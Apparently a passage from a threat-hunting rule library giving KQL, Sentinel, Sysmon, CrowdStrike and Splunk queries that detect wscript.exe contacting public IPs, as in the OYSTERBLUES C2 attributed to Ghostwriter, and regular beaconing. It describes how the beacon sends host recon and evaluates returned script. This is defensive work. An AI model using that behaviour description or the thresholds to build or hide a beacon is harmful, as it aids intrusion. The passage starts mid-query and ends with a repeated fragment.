| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, RegistryKey, RegistryValue, RegistryValueType, ValueLen
| order by TimeGenerated desc

[LLM] Ghostwriter OYSTERBLUES C2: wscript.exe HTTP POST exfiltrating host recon to external IP Command & Control High
Hunts the OYSTERBLUES C2 beacon CERT-UA describes: wscript.exe running the OYSTERBLUES JS makes an HTTP POST to an attacker server carrying computer name, user, OS version, last-boot time and running-process list, then eval()s the JS response (which lands Cobalt Strike). Detection is wscript.exe as the network-initiating process to a public IP on HTTP(S) ports. Rationale: Anchored on the article's two explicit C2 facts: (1) the beacon is wscript.exe (CERT-UA names it as the runtime and recommends restricting it), and (2) the channel is an HTTP POST to a C2 server (so HTTP(S) ports + public IP). wscript.exe legitimately almost never reaches the public internet — that single combination is highly specific. Sentinel query rebuilt as ImProcessCreate-to-ImNetworkSession join because ImNetworkSession has no process-name column. Cross-checked against: • https://cert.gov.ua/article • https://attack.mitre.org/techniques/T1071/001/
ATT&CKT1071.001 T1059.007 T1041 T1082
Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "wscript.exe"
| where RemoteIPType == "Public"
| where RemotePort in (80, 443, 8080, 8443)
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc
let WindowMinutes = 30m;
let WscriptProcs = ImProcessCreate
    | where TimeGenerated > ago(7d)
    | where ActingProcessName endswith "wscript.exe"
    | where ActorUsername !endswith "$"
    | project ProcTime = TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, ActingProcessId;
ImNetworkSession
| where TimeGenerated > ago(7d)
| where NetworkDirection == "Outbound"
| where DstPortNumber in (80, 443, 8080, 8443)
| where not(ipv4_is_private(DstIpAddr))
| join kind=inner WscriptProcs on DvcHostname
| where TimeGenerated between (ProcTime .. (ProcTime + WindowMinutes))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, DstIpAddr, DstPortNumber, Url, NetworkBytes
source:windows.sysmon @EventID:3 @Image:(*\\wscript.exe OR *\\WScript.exe OR *\\WSCRIPT.EXE) @DestinationPort:(80 OR 443 OR 8080 OR 8443) NOT CIDR(@DestinationIp, 10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12, 127.0.0.0/8)
#event_simpleName=NetworkConnectIP4 ContextImageFileName=/\\wscript\.exe$/i
| RemotePort=80 OR RemotePort=443 OR RemotePort=8080 OR RemotePort=8443
| NOT cidr("10.0.0.0/8", field=RemoteAddressIP4)
| NOT cidr("192.168.0.0/16", field=RemoteAddressIP4)
| NOT cidr("172.16.0.0/12", field=RemoteAddressIP4)
| NOT cidr("127.0.0.0/8", field=RemoteAddressIP4)
| groupBy([aid, ComputerName, ContextImageFileName, RemoteAddressIP4, RemotePort], function=count())
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count from datamodel=Network_Traffic.All_Traffic where All_Traffic.app=wscript.exe AND All_Traffic.dest_port IN (80,443,8080,8443) AND NOT (All_Traffic.dest_ip="10.0.0.0/8" OR All_Traffic.dest_ip="192.168.0.0/16" OR All_Traffic.dest_ip="172.16.0.0/12" OR All_Traffic.dest_ip="127.0.0.0/8") by All_Traffic.src All_Traffic.user All_Traffic.app All_Traffic.dest_ip All_Traffic.dest_port All_Traffic.bytes_out | `drop_dm_object_name(All_Traffic)`
| tstats summariesonly=false count from datamodel=Network_Traffic.All_Traffic where All_Traffic.app=wscript.exe AND All_Traffic.dest_port IN (80,443,8080,8443) AND NOT (All_Traffic.dest_ip="10.0.0.0/8" OR All_Traffic.dest_ip="192.168.0.0/16" OR All_Traffic.dest_ip="172.16.0.0/12" OR All_Traffic.dest_ip="127.0.0.0/8") by All_Traffic.src All_Traffic.user All_Traffic.app All_Traffic.dest_ip All_Traffic.dest_port All_Traffic.bytes_out | `drop_dm_object_name(All_Traffic)`
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
